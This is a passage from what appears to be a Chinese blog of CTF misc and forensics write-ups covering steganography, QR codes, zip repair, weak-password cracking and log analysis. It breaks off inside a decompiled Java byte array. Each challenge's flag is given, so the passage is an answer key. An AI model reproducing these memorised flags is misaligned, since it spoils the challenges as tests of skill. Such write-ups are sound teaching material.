cftLfW9xk8T/jLvZQG8LFkAp5mn4zRb6/w9ypBe1Czot9rj66qnmw17HZVt+07T6J6vLRO8R0DTL01vZPsjiHJ3568vC7wMWQAAhCwAAEIWAAAhCwCAkAUAQMgCACBkAQAQsgAACFkAAIQsAABCFgAAIQsAgJAFAEDIAgAgZAG8oXx98vaNxev3KT/9EuP2zcfL1yAX/RuR81XJ7fi4TV0DfCxZAG9oyII+shtZAPwfsgDe0D4L+tkPJvajLKhkAfxqsgDO1IftogzjcmO5ul663L62LNjvUP/H30/7cd+jHa/XtiHfz+uzZX3O6hrgY8kCONH6JwGLPnb3l9uIXib0zt0sOOw5q1lwKffr+B+zIDv3Jbs1wMeSBfAitnlcD2M/oofT3S8Rnq3sJ3X8Pzq+ftVrs/Ec+EiyAM7Uh21R53fTBnE+AVhm/XBes2BcuY759XiZ7OWkr6nHsW2zWwN8LFkA5zmO6eMgnqx/S7DvgOE0++SpZZ/d6fH1agrU4+tXXmNZvVsDfCxZAKdZpnvV5ncfwatpFt9bej8LhofzlwT/PQvWt5f1dQ3wsWQBnGib9pfbbZ3HGcGR2V/Wrv+Vv5sFT1aWEtid1JHfj/v6ZaP5Tl0DfCxZAB+szvUnjHwgZAF8mO2zgtXygcMDu08UgF9NFsCHGbLg+bAvi1UBIAvgd/vhbxmA30IWAAAhCwCAkAUAQMgCACBkAQAQsgAACFkAAIQsAABCFgAAIQsAgJAFAEDIAgAgZAEAELIAAAhZAACELAAAQhYAACELAICQBQBAyAIAIGQBABCyAAAIWQAAhCwAAEIWAAAhCwCAkAUAQMgCACBkAQAQsgAACFkAAIQsAABCFgAAIQsAgJAFAEDIAgAgZAEAELIAAAhZAACELAAAQhYAACELAICQBQBAyAIAIGQBABCyAABo/vz5F0zy112cRmQgAAAAAElFTkSuQmCC</span><br></pre></td></tr></table></figure><p>用base64解密并保存为一个png图片可以看到内容</p><p><img src="/image/media/2022/ctf/bmz/img/5.png"></p><p>得到压缩包密码asdfghjkl，并且压缩包里面都是二维码，一个二维码对应一个字符批量识别得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0110011010101001011100111011001010111001100111001010110110000111110101101000101100101101111011001010001011010010011010011011011011011001000011001010011100010111</span><br></pre></td></tr></table></figure><p>然后用八位一起二进制得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;QRcode1sUseful&#125;</span><br></pre></td></tr></table></figure><h2 id="日志审计"><a href="#日志审计" class="headerlink" title="日志审计"></a>日志审计</h2><p>可以看到存在大量日志信息，并且直接搜flag,看到sqlmap能够对flag.php进行扫描，取出来这部分日志信息，然后用脚本提取一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;mayiyahei1965ae7569&#125;</span><br></pre></td></tr></table></figure><h2 id="海量的txt文件"><a href="#海量的txt文件" class="headerlink" title="海量的txt文件"></a>海量的txt文件</h2><p>得到大量的txt文件，放进kali</p><p>执行命令grep -rn key ./flag </p><p><img src="/image/media/2022/ctf/bmz/img/7.png"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key&#123;fe9ff627da72364a&#125;</span><br></pre></td></tr></table></figure><h2 id="哆啦A梦"><a href="#哆啦A梦" class="headerlink" title="哆啦A梦"></a>哆啦A梦</h2><p>hint:图片少了点什么</p><p>binwalk+foremost得到部分二维码，然后多半猜测是CRC，改成300*300得到完整二维码</p><p>识别得到ZmxhZ3tDdGZfMjAxOF92ZXJ5X2dvb2R9经过base64解密后得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Ctf_2018_very_good&#125;</span><br></pre></td></tr></table></figure><h2 id="flag就在这"><a href="#flag就在这" class="headerlink" title="flag就在这"></a>flag就在这</h2><p>得到一个破损的zip，可以看到文件头破损，zip文件头50 4B 03 04</p><p><img src="/image/media/2022/ctf/bmz/img/8.png"></p><p>修复之后提示需要密码，但是没有任何提示，猜测是弱密码，爆破得到密码155466得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3a845dd9-4e8a-5b6b-38c7-a78d66e8a055&#125;</span><br></pre></td></tr></table></figure><h2 id="Fix-it"><a href="#Fix-it" class="headerlink" title="Fix it"></a>Fix it</h2><p>修复这个看似陌生的老熟人吧。修复一下，识别</p><p><img src="/image/media/2022/ctf/bmz/img/9.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;easyQRcode&#125;</span><br></pre></td></tr></table></figure><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>得到png图片但是内容是文本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">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trPplB00mg+8973832uuISLCiYNuznOecSi//PdNXmWMY8YefZRjjjmR0gJRRBzHGGOI8Pwg63Z3amkHuwXh6WBNexvMUGAosDSxwSNIPsq5F5/Dr275HK1DX8VdYxu58INn0DQFSIK42M9E4bj8ki/x9jedhZM2Il2OednJnPbfz6FgKzDBu07/CPffu40ntkyQuVHuWX0BH3/98fxSLWLNQAraYYsOI+MJww4GspQRM495seOmf7meZMXrWSOCdO7grwfu582v+ySlTaBzP9/8zEpefvobeKDYihQ/4I0rDC9725U8RIr9xYN8/G1ncePtG9leCI9vvInbbvoHrrzmy4zJAGdf+n0eTZ9Hd3QT0l7P9f/zeM44osG6zWtZv2Ujeyw4iC//07UctvcS5ijFwctfyc8e3ExXQDcSDNv5+lcuY9F+z2fOnvOx5Ta6nU0o58/qcuU/yhUoV3jJoeAtJ63gwV/eTFt5j+ojv7qThUvm8d1rfhVU0EfpbPoZz3rh4Zhh+OqXv8TFn/1f/PzHD7B9XCjl++yx55285m8/SW4H+btXnM49P36UDim5Mvx27RdZuvRuvvzNq+kCdNs8+tv7+OsXvNavmRuDfAs2UhR4LTZtBhXZWmajZ/OFEMJ+YTcgvP8YZeUGc448z4miiGbD/1bYgjzPaTQa3sZJNB/55Cd5zcknA5DlGWeccQZjY2PkZc5EZ4JbbrmFK674EkkSYzAke+/Npz/9vml7yFpuuOEGli1bRhQcNABTU1MsWbKEV7/ipb2xnf+JT3DfffexYQMgwlmXXMIbXvMGbxdFEaeffjpTU1NsC3G9hxxyCPvttwBrYdHip3PNNdfwupNeR1EUrF69mtNOO410eBiKgsOOOYY3vvGN3HrrrWitWbNmDXfddRdr166lW1re8Y538LrXvY7t273K3OlMceONN3LuuacBEMexP4b5PViyZAm333473UxwwNVXX8273vUufv7zn7NtDFCKK6+8khNPPBGASy+9lCuuuIL99ltKGgMUrFq1invvvZc77hhjyZIl/PSnP2X7hO//uuuu46yzzmLNmjV0xfd34403cvzxx3tzUimOO+44brzxpp6NJ855otuJPce7AeEFHha8mgaDxlS+TUxifACgi2CqYFxPkAO2DQ09gGYQrZo4GQO7jdEHx3njye8gVgM0B4c4aP9D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</span><br></pre></td></tr></table></figure><p>用脚本转成png</p><p><img src="/image/media/2022/ctf/bmz/img/10.png"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;base64_wow&#125;</span><br></pre></td></tr></table></figure><h2 id="宝宝"><a href="#宝宝" class="headerlink" title="宝宝"></a>宝宝</h2><p>得到一个二维码，但是识别内容是：一个宝宝是解不开这个东西的！</p><p>binwalk+foremost得到一个加密的zip，爆破无果，用题目名称试试：babybaby</p><p>得到一个readme.txt和一个flag</p><p>txt里面的东西被64解密之后得到：离成功只差一步了….</p><p>flag没有后缀名，补一个png，得到二维码，识别得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ThIs_Is_QR_Code&#125;</span><br></pre></td></tr></table></figure><h2 id="小明的演讲"><a href="#小明的演讲" class="headerlink" title="小明的演讲"></a>小明的演讲</h2><p>得到一个pptx，用zip形式打开，在ppt/media/路径下面有个xiaoming.zip包</p><p>里面有一个zip和两个txt</p><p>密码第一部分：2053250813784316：用在线工具<a href="https://www.qqxiuzi.cn/bianma/dianbao.php%E8%A7%A3%E5%87%BA%E5%BE%97%E5%88%B0%EF%BC%9A%E6%88%91%E6%98%AF%E5%AF%86%E7%A0%81">https://www.qqxiuzi.cn/bianma/dianbao.php解出得到：我是密码</a></p><p>密码第二部分：ᅢ彎⽦왛Ÿ：修改txt文件头为FE FF得到：我也是密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FE FF是一种BOM文件头，BOM是用来判断文本文件是哪一种Unicode编码的标记，其本身是一个Unicode字符（&quot;\uFEFF&quot;），位于文本文件头部</span><br></pre></td></tr></table></figure><p>所以整个zip密码就是：我是密码我也是密码</p><p>打开得到c3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3NzZmxhZ3twcHR4cG93ZXJwb2ludH0=</p><p>base64解密之后得到sssssssssssssssssssssssssssflag{pptxpowerpoint}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;pptxpowerpoint&#125;</span><br></pre></td></tr></table></figure><h2 id="SDNISC2020-过去和现在"><a href="#SDNISC2020-过去和现在" class="headerlink" title="SDNISC2020_过去和现在"></a>SDNISC2020_过去和现在</h2><p>得到一个图片，用binwalk -e分离处理四个文件有一个falg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;fc25cbb7b85959fe03738241a96bf23d&#125;</span><br></pre></td></tr></table></figure><h2 id="长安杯-binary"><a href="#长安杯-binary" class="headerlink" title="[长安杯]binary"></a>[长安杯]binary</h2><p>无后缀名文件。查看文件头可以猜测是个jar文件，逆向得到代码片段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="line">// (powered by FernFlower decompiler)</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public Main() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] var0) &#123;</span><br><span class="line">        byte[] var10000 = new byte[]&#123;77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 